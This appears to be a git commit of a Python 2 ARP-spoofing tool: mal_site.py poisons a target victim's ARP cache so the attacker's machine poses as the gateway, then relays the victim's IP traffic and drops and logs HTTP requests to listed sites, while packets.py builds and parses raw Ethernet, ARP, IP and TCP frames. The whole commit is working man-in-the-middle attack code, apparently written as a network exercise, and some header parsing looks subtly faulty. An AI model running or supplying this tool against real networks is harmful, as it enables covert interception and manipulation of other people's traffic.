78b5e6994511c34c7caee405cc4e7bc49da7c620
unknown <>
2016-08-13 14:54:39 +0900

    first commit

---
+++ mal_site.py
@@ -0,0 +1,210 @@
+import netifaces
+import sys
+import threading
+import time
+import re
+
+import pcap
+
+from urlparse import urlparse
+
+from packets import *
+
+mal_sites = set()
+my_mac = None
+victim_ip = None
+victim_mac = None
+gateway_ip = None
+gateway_mac = None
+
+
+def send_periodically(infection_reply, interval_in_second=20):
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('arp')
+    while True:
+        pcap_handle.sendpacket(infection_reply.as_bytes())
+        print '[<+] Periodical packet sent'
+        time.sleep(interval_in_second)
+
+
+def reply_to_request(infection_reply):
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('arp')
+    while True:
+        try:
+            for capture in pcap_handle:
+                if capture is None:
+                    continue
+                time_stamp, packet = capture
+                arp = ARP(packet)
+                if arp.operation == ARP.OP_REQUEST \
+                        and arp.sender_protocol_address == victim_ip \
+                        and arp.sender_hardware_address == victim_mac \
+                        and arp.target_protocol_address == gateway_ip:
+                    print "[>+] Received victim's request for ip '{}'".format(gateway_ip.in_string)
+
+                    pcap_handle.sendpacket(infection_reply.as_bytes())
+                    print '[<+] Sent victim attack packet'
+        except KeyboardInterrupt:
+            return
+        except:
+            pass
+
+        print 'following request of gateway stopped unexpectedly. restarting.'
+        pcap_handle = pcap.pcap(timeout_ms=0)
+
+
+def follow_request_of_gateway(infection_request):
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('arp')
+    while True:
+        try:
+            for capture in pcap_handle:
+                if capture is None:
+                    continue
+                time_stamp, packet = capture
+                arp = ARP(packet)
+                if arp.operation == ARP.OP_REQUEST \
+                        and arp.ethernet.destination_mac == Ethernet.BROADCAST \
+                        and arp.sender_protocol_address == gateway_ip \
+                        and arp.sender_hardware_address == gateway_mac:
+                    print "[>!] Detected gateway's arp request".format(gateway_ip)
+
+                    pcap_handle.sendpacket(infection_request.as_bytes())
+                    print '[<!] Sent victim infection request'
+        except KeyboardInterrupt:
+            return
+        except:
+            pass
+
+        print 'relaying ip stopped unexpectedly. restarting.'
+        pcap_handle = pcap.pcap(timeout_ms=0)
+
+
+def filter_and_relay_ip():
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('ip src host {}'.format(victim_ip.in_string))
+    while True:
+        try:
+            for capture in pcap_handle:
+                if capture is None:
+                    continue
+                time_stamp, packet = capture
+                print "[>!]got victim's ip packet to gateway."
+                relaying_packet = IP(packet)
+                if relaying_packet.protocol == IP.PROTOCOL_TCP:
+                    relaying_tcp = TCP(packet)
+                    first_line = relaying_tcp.payload.split('\n', 1)[0]
+                    if 'HTTP/' in first_line:
+                        try:
+                            host = re.search(r'\nHost: (.*)', relaying_tcp.payload).group(1)
+                            if host in mal_sites:
+                                with open('log.txt', 'a') as log_file:
+                                    log_file.write('{} tried to access mal site {}\n'.format(victim_ip.in_string, host))
+
+                                continue  # don't relay
+                        except:
+                            pass
+
+                relaying_packet.ethernet.source_mac = my_mac
+                relaying_packet.ethernet.destination_mac = gateway_mac
+                pcap_handle.sendpacket(relaying_packet.as_bytes())
+                print '[<!]sent relay.'
+        except:
+            pass
+
+        print 'relaying ip stopped unexpectedly. restarting.'
+        pcap_handle = pcap.pcap(timeout_ms=0)
+
+
+def main():
+    global my_mac, victim_ip, victim_mac, gateway_ip, gateway_mac, mal_sites
+    if len(sys.argv) not in (2, 3):
+        print 'Usage: python mal_site.py victim_ip [interface_name]'
+        exit(1)
+
+    with open('mal_sites.txt') as f:
+        for url in f.read().splitlines():
+            mal_sites.add(urlparse(url).netloc)
+
+    gateways = netifaces.gateways()
+    interface_name = pcap.lookupdev()
+    addresses = netifaces.ifaddresses(interface_name)
+
+    my_mac = MacAddress(addresses[netifaces.AF_LINK][0]['addr'])
+    my_ip = IPv4Address(addresses[netifaces.AF_INET][0]['addr'])
+    if len(sys.argv) == 2:
+        try:
+            gateway_ip = IPv4Address(gateways[netifaces.AF_INET][0][0])
+        except KeyError:
+            print 'No internet gateway detected.'
+            exit(1)
+    else:
+        for address, interface, is_default in gateways[netifaces.AF_INET]:
+            if interface == sys.argv[2]:
+                gateway_ip = address
+                break
+        else:
+            print 'There is no interface named {}'.format(sys.argv[2])
+            exit(1)
+    victim_ip = IPv4Address(sys.argv[1])
+    print
+
+    print 'my      mac: {}'.format(my_mac.in_string)
+    print 'my      ip : {}'.format(my_ip.in_string)
+    print 'gateway ip : {}'.format(gateway_ip.in_string)
+    print 'victim  ip : {}'.format(victim_ip.in_string)
+
+    pcap_handle = pcap.pcap(timeout_ms=0)
+    pcap_handle.setfilter('arp')
+    # ask gateway its mac address
+    asking_arp = normal_request_arp(my_mac, my_ip, gateway_ip)
+    pcap_handle.sendpacket(asking_arp.as_bytes())
+    print '[<+] Sent gateway({}) an ARP request'.format(gateway_ip.in_string)
+    for capture in pcap_handle:
+        if capture is None:
+            continue
+        time_stamp, packet = capture
+        arp = ARP(packet)
+        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == gateway_ip:
+            gateway_mac = arp.sender_hardware_address
+            print "[>+] gateway replied its mac is '{}'".format(gateway_mac.in_string)
+            break
+    else:
+        raise RuntimeError('Packet capture ended unexpectedly.')
+
+    # ask victim his mac address
+    asking_arp = normal_request_arp(my_mac, my_ip, victim_ip)
+    pcap_handle.sendpacket(asking_arp.as_bytes())
+    print '[<+] Sent victim({}) an ARP request'.format(victim_ip.in_string)
+
+    # wait for victim's response
+    for capture in pcap_handle:
+        if capture is None:
+            continue
+        time_stamp, packet = capture
+        arp = ARP(packet)
+        if arp.operation == ARP.OP_REPLY and arp.sender_protocol_address == victim_ip:
+            victim_mac = arp.sender_hardware_address
+            print "[>+] victim replied his mac is '{}'".format(victim_mac.in_string)
+            break
+    else:
+        raise RuntimeError('Packet capture ended unexpectedly.')
+
+    # attack packet
+    infection_reply = normal_reply_arp(my_mac, gateway_ip, victim_mac, victim_ip)
+    infection_request = normal_request_arp(my_mac, gateway_ip, my_ip)
+
+    replier = threading.Thread(target=reply_to_request, args=(infection_reply,))
+    periodical = threading.Thread(target=send_periodically, args=(infection_reply,))
+    gateway_follower = threading.Thread(target=follow_request_of_gateway, args=(infection_request,))
+
+    replier.start()
+    periodical.start()
+    gateway_follower.start()
+
+    filter_and_relay_ip()
+
+
+if __name__ == '__main__':
+    main()
---
+++ packets.py
@@ -0,0 +1,304 @@
+import string
+import struct
+
+
+class IPv4Address(object):
+    """
+    >>> ip1 = IPv4Address('192.168.0.1')
+    >>> ip2 = IPv4Address('\x7f\x00\x00\x01')
+    >>> ip1.in_bytes
+    '\xc0\xa8\x00\x01'
+    >>> ip2.in_string
+    '127.0.0.1'
+    >>> ip2.in_string = '8.8.8.8'
+    >>> ip2.in_bytes
+    '\x08\x08\x08\x08'
+    """
+    LENGTH = 4
+
+    def __init__(self, address):
+        assert isinstance(address, str)
+        if len(address) == IPv4Address.LENGTH:
+            # when address is in raw bytes form
+            self.in_bytes = address
+        else:
+            # when address is in dot-decimal notation.
+            self.in_string = address
+
+    @property
+    def in_string(self):
+        return '.'.join('{:d}'.format(ord(byte)) for byte in self.in_bytes)
+
+    @in_string.setter
+    def in_string(self, address):
+        try:
+            in_integers = map(int, address.split('.'))
+            assert len(in_integers) == 4
+        except (AssertionError, ValueError, TypeError):
+            raise ValueError('address is not in right form.')
+        self.in_bytes = struct.pack('<BBBB', *in_integers)
+
+    def __repr__(self):
+        return 'IPv4Address({})'.format(self.in_string)
+
+    def __eq__(self, other):
+        assert isinstance(other, IPv4Address)
+        return self.in_bytes == other.in_bytes
+
+    def __ne__(self, other):
+        assert isinstance(other, IPv4Address)
+        return self.in_bytes != other.in_bytes
+
+
+class MacAddress(object):
+    LENGTH = 6
+
+    def __init__(self, address):
+        assert isinstance(address, str)
+        if len(address) == MacAddress.LENGTH:
+            # when address is in raw bytes form
+            self.in_bytes = address
+        else:
+            # when address is in form with 12 hex digits.
+            # for example 'xx:xx:xx:xx:xx:xx' or 'xx-xx-xx-xx-xx-xx'
+            #  or 'xxxxxx-xxxxxx' or 'xxxxxxxxxxxx'
+            hexonly = ''.join(c for c in address if c in string.hexdigits)
+            if len(hexonly) != 12:
+                raise ValueError('MAC address is not in right form. ({} hex digits not 12)'.format(len(hexonly)))
+            self.in_bytes = hexonly.decode('hex')
+
+    @property
+    def in_string(self):
+        return ':'.join('{:02X}'.format(ord(byte)) for byte in self.in_bytes)
+
+    def __repr__(self):
+        return 'MacAddress({})'.format(self.in_string)
+
+    def __eq__(self, other):
+        assert isinstance(other, MacAddress)
+        return self.in_bytes == other.in_bytes
+
+    def __ne__(self, other):
+        assert isinstance(other, MacAddress)
+        return self.in_bytes != other.in_bytes
+
+
+class Ethernet(object):
+    TYPE_ARP = 0x0806
+    BROADCAST = MacAddress('ff:ff:ff:ff:ff:ff')
+
+    def __init__(self, raw_packet=None):
+        if raw_packet is None:
+            self.destination_mac = None
+            self.source_mac = None
+            self.type = None
+            self.data = None
+        else:
+            self.destination_mac = MacAddress(raw_packet[:6])
+            self.source_mac = MacAddress(raw_packet[6:12])
+            self.type = struct.unpack('!H', raw_packet[12:14])[0]
+            self.data = raw_packet[14:]
+
+    def as_bytes(self):
+        return self.header_as_bytes() + self.data
+
+    def header_as_bytes(self):
+        return ''.join((
+            self.destination_mac.in_bytes,
+            self.source_mac.in_bytes,
+            struct.pack('!H', self.type)
+        ))
+
+
+class ARP(object):
+    HARDWARE_ETHERNET = 1
+    PROTO_IPv4 = 0x0800
+    OP_REQUEST = 1
+    OP_REPLY = 2
+
+    def __init__(self, raw_packet=None):
+        if raw_packet is None:
+            self.ethernet = Ethernet()
+            self.hardware_type = None
+            self.protocol_type = None
+            self.hardware_size = None
+            self.protocol_size = None
+            self.operation = None
+            self.sender_hardware_address = None
+            self.sender_protocol_address = None
+            self.target_hardware_address = None
+            self.target_protocol_address = None
+        else:
+            self.ethernet = Ethernet(raw_packet)
+            raw_arp = self.ethernet.data
+
+            self.hardware_type = struct.unpack('!H', raw_arp[:2])[0]
+            self.protocol_type = struct.unpack('!H', raw_arp[2:4])[0]
+            self.hardware_size = struct.unpack('!B', raw_arp[4])[0]
+            self.protocol_size = struct.unpack('!B', raw_arp[5])[0]
+            self.operation = struct.unpack('!H', raw_arp[6:8])[0]
+            self.sender_hardware_address = MacAddress(raw_arp[8:14])
+            self.sender_protocol_address = IPv4Address(raw_arp[14:18])
+            self.target_hardware_address = MacAddress(raw_arp[18:24])
+            self.target_protocol_address = IPv4Address(raw_arp[24:28])
+
+    def as_bytes(self):
+        return ''.join((
+            self.ethernet.header_as_bytes(),
+            struct.pack('!H', self.hardware_type),
+            struct.pack('!H', self.protocol_type),
+            struct.pack('!B', self.hardware_size),
+            struct.pack('!B', self.protocol_size),
+            struct.pack('!H', self.operation),
+            self.sender_hardware_address.in_bytes,
+            self.sender_protocol_address.in_bytes,
+            self.target_hardware_address.in_bytes,
+            self.target_protocol_address.in_bytes
+        ))
+
+    def __str__(self):
+        return self.as_bytes()
+
+
+# some usual ARP presets
+def normal_request_arp(asker_mac, asker_ip, target_ip):
+    arp = ARP()
+    arp.ethernet.destination_mac = Ethernet.BROADCAST
+    arp.ethernet.source_mac = asker_mac
+    arp.ethernet.type = Ethernet.TYPE_ARP
+
+    arp.hardware_type = ARP.HARDWARE_ETHERNET
+    arp.protocol_type = ARP.PROTO_IPv4
+    arp.hardware_size = MacAddress.LENGTH
+    arp.protocol_size = IPv4Address.LENGTH
+
+    arp.operation = ARP.OP_REQUEST
+    arp.sender_hardware_address = asker_mac
+    arp.sender_protocol_address = asker_ip
+    arp.target_hardware_address = MacAddress('00:00:00:00:00:00')
+    arp.target_protocol_address = target_ip
+    return arp
+
+
+def normal_reply_arp(replier_mac, replier_ip, recipient_mac, recipient_ip):
+    arp = ARP()
+    arp.ethernet.destination_mac = recipient_mac
+    arp.ethernet.source_mac = replier_mac
+    arp.ethernet.type = Ethernet.TYPE_ARP
+
+    arp.hardware_type = ARP.HARDWARE_ETHERNET
+    arp.protocol_type = ARP.PROTO_IPv4
+    arp.hardware_size = MacAddress.LENGTH
+    arp.protocol_size = IPv4Address.LENGTH
+
+    arp.operation = ARP.OP_REPLY
+    arp.sender_hardware_address = replier_mac
+    arp.sender_protocol_address = replier_ip
+    arp.target_hardware_address = recipient_mac
+    arp.target_protocol_address = recipient_ip
+    return arp
+
+
+class IP(object):
+    PROTOCOL_TCP = 6
+
+    def __init__(self, raw_packet=None):
+        if raw_packet is None:
+            self.ethernet = Ethernet()
+            self.version = None
+            self.type_of_service = None
+            self.header_length_in_words = None
+            self.total_length = None
+            self.fragment_identifier = None
+            self.fragment_flag = None
+            self.fragment_offset = None
+            self.time_to_live = None
+            self.protocol = None
+            self.header_checksum = None
+            self.source_address = None
+            self.destination_address = None
+            self.data = None
+        else:
+            self.ethernet = Ethernet(raw_packet)
+            raw_ip = self.ethernet.data
+
+            first_byte = struct.unpack('!B', raw_ip[0])[0]
+            self.version = first_byte & 0xf
+            self.header_length_in_words = first_byte >> 4
+            self.type_of_service = struct.unpack('!B', raw_ip[1])[0]
+            self.total_length = struct.unpack('!H', raw_ip[2:4])[0]
+            self.fragment_identifier = struct.unpack('!H', raw_ip[4:6])
+            self.fragment_flag = struct.unpack('!H', raw_ip[6])[0] & 0b111
+            self.fragment_offset = struct.unpack('!H', raw_ip[6:8])[0] >> 3
+            self.time_to_live = struct.unpack('!B', raw_ip[8])[0]
+            self.protocol = struct.unpack('!B', raw_ip[9])[0]
+            self.header_checksum = struct.unpack('!H', raw_ip[10:12])[0]
+            self.source_address = IPv4Address(raw_ip[12:16])
+            self.destination_address = IPv4Address(raw_ip[16:20])
+            self.optional = raw_ip[20:self.header_length()]
+            self.data = raw_ip[self.header_length():]
+
+    def header_length(self):
+        try:
+            return self.header_length_in_words * 4
+        except:
+            return 20
+
+    def headers_as_bytes(self):
+        return ''.join((
+            self.ethernet.as_bytes(),
+            struct.pack('!B', (self.header_length_in_words << 4) | self.version),
+            struct.pack('!B', self.type_of_service),
+            struct.pack('!H', self.total_length),
+            struct.pack('!H', self.fragment_identifier),
+            struct.pack('!H', self.fragment_flag),
+            struct.pack('!H', self.fragment_offset),
+            struct.pack('!B', self.time_to_live),
+            struct.pack('!B', self.protocol),
+            struct.pack('!H', self.header_checksum),
+            self.source_address.in_bytes,
+            self.destination_address.in_bytes,
+            self.optional
+        ))
+
+    def as_bytes(self):
+        return self.headers_as_bytes() + self.data
+
+
+class TCP(object):
+    def __init__(self, raw_packet):
+        self.ip = IP(raw_packet)
+        raw_tcp = self.ip.data
+        self.source_port = struct.unpack('!H', raw_tcp[:2])[0]
+        self.destination_port = struct.unpack('!H', raw_tcp[2:4])[0]
+        self.sequence_number = struct.unpack('!I', raw_tcp[4:8])[0]
+        self.acknowledge_number = struct.unpack('!I', raw_tcp[8:12])[0]
+        self.data_offset_in_word = struct.unpack('!B', raw_tcp[12])[0] & 0xf
+        self.flags = struct.unpack('!H', raw_tcp[12:14])[0] >> 4
+        self.window_size = struct.unpack('!H', raw_tcp[14:16])[0]
+        self.checksum = struct.unpack('!H', raw_tcp[16:18])[0]
+        self.urgent_pointer = struct.unpack('!H', raw_tcp[18:20])[0]
+        self.optional = raw_tcp[20:self.header_length()]
+        self.payload = raw_tcp[self.header_length():]
+
+    def header_length(self):
+        try:
+            return self.data_offset_in_word * 4
+        except:
+            return 20
+
+    def as_bytes(self):
+        return ''.join((
+            self.ip.headers_as_bytes(),
+            struct.pack('!H', self.source_port),
+            struct.pack('!H', self.destination_port),
+            struct.pack('!I', self.sequence_number),
+            struct.pack('!I', self.acknowledge_number),
+            struct.pack('!B', self.data_offset_in_word),
+            struct.pack('!H', self.flags << 4 | self.data_offset_in_word),
+            struct.pack('!H', self.window_size),
+            struct.pack('!H', self.checksum),
+            struct.pack('!H', self.urgent_pointer),
+            self.optional,
+            self.payload
+        ))
